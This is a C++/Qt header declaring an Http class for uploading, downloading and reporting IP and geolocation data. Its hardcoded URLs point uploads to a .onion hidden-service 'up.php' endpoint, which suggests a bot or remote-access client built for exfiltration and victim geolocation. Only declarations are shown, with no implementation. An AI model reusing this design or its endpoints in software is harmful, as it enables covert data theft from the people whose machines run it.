#ifndef DOWNLOADER_H
#define DOWNLOADER_H

#include "client.h"
#include <QFile>
#include <QThread>
#include <QNetworkReply>
#include <QJsonDocument>
#include <QJsonObject>

#define URL_UPLOAD "https://rchlie7hgfhecoi7.onion/up.php"
#define URL_DOWNLOAD "https://rchlie7hgfhecoi7.onion"
#define URL_IP "http://bot.whatismyipaddress.com"
#define URL_INFO "http://api.ipaddresslabs.com/iplocation/v1.7/locateip?key=demo&format=json&ip="
#define IP_RAW 1
#define IP_INFO 2
#define DOWNLOAD 3
#define UPLOAD 4

class Http : public QObject
{
    Q_OBJECT
public:
    explicit Http(int, QString _url = "", QString _filename = "", QString _dst = "", QObject *parent = 0);

signals:
    void finished(QString);
    void finished();

public slots:
    void downloadFile();
    void uploadFile();
    void sendInfo();
    void getInfo(QString);
    void finish(QString);
    void finish();
    void replyFinished(QNetworkReply *);

private:
   QNetworkAccessManager *manager;
   QNetworkProxy proxy;
   QString ip;
   QString url;
   QString dst;
   QString filename;
   int cmd;
};

#endif // DOWNLOADER_H
